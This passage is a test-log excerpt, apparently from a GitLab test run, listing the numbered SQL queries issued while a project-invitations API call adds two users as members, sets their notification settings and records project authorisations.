\"created_at\", \"updated_at\", \"created_by_id\", \"member_namespace_id\", \"notification_level\") VALUES (30, 99, 'Project', 739, 'ProjectMember', '2022-03-01 16:06:45.438776', '2022-03-01 16:06:45.438776', 736, 1010, 3) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       51: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" = 'Project' AND \"notification_settings\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       52: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" = 'Project' AND \"notification_settings\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       53: INSERT INTO \"notification_settings\" (\"user_id\", \"source_id\", \"source_type\", \"created_at\", \"updated_at\", \"level\") VALUES (739, 99, 'Project', '2022-03-01 16:06:45.448276', '2022-03-01 16:06:45.448276', 3) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       54: INSERT INTO \"events\" (\"project_id\", \"author_id\", \"created_at\", \"updated_at\", \"action\") VALUES (99, 739, '2022-03-01 16:06:45.451257', '2022-03-01 16:06:45.451257', 8) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       55: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       56: SELECT 1 AS one FROM \"user_interacted_projects\" WHERE \"user_interacted_projects\".\"project_id\" = 99 AND \"user_interacted_projects\".\"user_id\" = 739 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       57: INSERT INTO \"user_interacted_projects\" (\"project_id\",\"user_id\") VALUES (99, 739) ON CONFLICT (\"project_id\",\"user_id\") DO NOTHING RETURNING \"project_id\",\"user_id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       58: SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 99 AND \"routes\".\"source_type\" = 'Project' LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       59: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       60: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 740 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       61: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       62: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       63: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 736 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       64: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 740 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       65: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"user_id\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"member_namespace_id\", \"notification_level\") VALUES (30, 99, 'Project', 740, 'ProjectMember', '2022-03-01 16:06:45.495546', '2022-03-01 16:06:45.495546', 736, 1010, 3) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       66: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 740 AND \"notification_settings\".\"source_type\" = 'Project' AND \"notification_settings\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       67: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 740 AND \"notification_settings\".\"source_type\" = 'Project' AND \"notification_settings\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       68: INSERT INTO \"notification_settings\" (\"user_id\", \"source_id\", \"source_type\", \"created_at\", \"updated_at\", \"level\") VALUES (740, 99, 'Project', '2022-03-01 16:06:45.504420', '2022-03-01 16:06:45.504420', 3) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       69: INSERT INTO \"events\" (\"project_id\", \"author_id\", \"created_at\", \"updated_at\", \"action\") VALUES (99, 740, '2022-03-01 16:06:45.507279', '2022-03-01 16:06:45.507279', 8) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       70: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       71: SELECT 1 AS one FROM \"user_interacted_projects\" WHERE \"user_interacted_projects\".\"project_id\" = 99 AND \"user_interacted_projects\".\"user_id\" = 740 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       72: INSERT INTO \"user_interacted_projects\" (\"project_id\",\"user_id\") VALUES (99, 740) ON CONFLICT (\"project_id\",\"user_id\") DO NOTHING RETURNING \"project_id\",\"user_id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       73: SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 99 AND \"routes\".\"source_type\" = 'Project' LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       74: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       75: SELECT \"project_authorizations\".\"user_id\", \"project_authorizations\".\"access_level\" FROM \"project_authorizations\" WHERE \"project_authorizations\".\"project_id\" = 99 AND \"project_authorizations\".\"user_id\" = 739 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       76: SELECT 1 AS one FROM \"project_group_links\" WHERE \"project_group_links\".\"project_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       77: SELECT \"members\".\"user_id\", \"members\".\"access_level\" FROM \"members\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_id\" = 99 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"user_id\" IS NOT NULL AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"user_id\" = 739 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       78: SELECT \"members\".\"user_id\", \"members\".\"access_level\" FROM (VALUES (736, 50)) members (user_id, access_level) WHERE \"members\".\"user_id\" = 739 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       79: SELECT \"members\".\"user_id\" FROM (VALUES (739, 30)) members (user_id, access_level) GROUP BY \"members\".\"user_id\" ORDER BY \"members\".\"user_id\" ASC LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       80: SELECT \"members\".\"user_id\" FROM (VALUES (739, 30)) members (user_id, access_level) WHERE \"members\".\"user_id\" \u003e= 739 GROUP BY \"members\".\"user_id\" ORDER BY \"members\".\"user_id\" ASC LIMIT 1 OFFSET 1000 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       81: SELECT \"members\".\"user_id\", MAX(access_level) FROM (VALUES (739, 30)) members (user_id, access_level) WHERE \"members\".\"user_id\" \u003e= 739 GROUP BY \"members\".\"user_id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       82: INSERT INTO \"project_authorizations\" (\"user_id\",\"access_level\",\"project_id\") VALUES (739, 30, 99) ON CONFLICT (\"user_id\",\"project_id\",\"access_level\") DO NOTHING RETURNING \"user_id\",\"project_id\",\"access_level\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       83: SELECT \"web_hooks\".* FROM \"web_hooks\" WHERE \"web_hooks\".\"type\" = 'SystemHook' AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:45.552854')) AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:45.553205')) ORDER BY \"web_hooks\".\"id\" ASC LIMIT 1000 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       84: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" = 'Project' AND \"notification_settings\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       85: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       86: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       87: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" IS NULL AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       88: INSERT INTO \"notification_settings\" (\"user_id\", \"level\", \"created_at\", \"updated_at\") VALUES (739, 1, '2022-03-01 16:06:45.567855', '2022-03-01 16:06:45.567855') RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       89: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       90: SELECT \"project_authorizations\".\"user_id\", \"project_authorizations\".\"access_level\" FROM \"project_authorizations\" WHERE \"project_authorizations\".\"project_id\" = 99 AND \"project_authorizations\".\"user_id\" = 740 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       91: SELECT 1 AS one FROM \"project_group_links\" WHERE \"project_group_links\".\"project_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       92: SELECT \"members\".\"user_id\", \"members\".\"access_level\" FROM \"members\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_id\" = 99 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"user_id\" IS NOT NULL AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"user_id\" = 740 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       93: SELECT \"members\".\"user_id\", \"members\".\"access_level\" FROM (VALUES (736, 50)) members (user_id, access_level) WHERE \"members\".\"user_id\" = 740 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       94: SELECT \"members\".\"user_id\" FROM (VALUES (740, 30)) members (user_id, access_level) GROUP BY \"members\".\"user_id\" ORDER BY \"members\".\"user_id\" ASC LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       95: SELECT \"members\".\"user_id\" FROM (VALUES (740, 30)) members (user_id, access_level) WHERE \"members\".\"user_id\" \u003e= 740 GROUP BY \"members\".\"user_id\" ORDER BY \"members\".\"user_id\" ASC LIMIT 1 OFFSET 1000 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       96: SELECT \"members\".\"user_id\", MAX(access_level) FROM (VALUES (740, 30)) members (user_id, access_level) WHERE \"members\".\"user_id\" \u003e= 740 GROUP BY \"members\".\"user_id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       97: INSERT INTO \"project_authorizations\" (\"user_id\",\"access_level\",\"project_id\") VALUES (740, 30, 99) ON CONFLICT (\"user_id\",\"project_id\",\"access_level\") DO NOTHING RETURNING \"user_id\",\"project_id\",\"access_level\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       98: SELECT \"web_hooks\".* FROM \"web_hooks\" WHERE \"web_hooks\".\"type\" = 'SystemHook' AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:45.591174')) AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:45.591476')) ORDER BY \"web_hooks\".\"id\" ASC LIMIT 1000 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       99: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 740 AND \"notification_settings\".\"source_type\" = 'Project' AND \"notification_settings\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       100: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 740 AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       101: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       102: SELECT 1 AS one FROM \"notification_settings\" WHERE 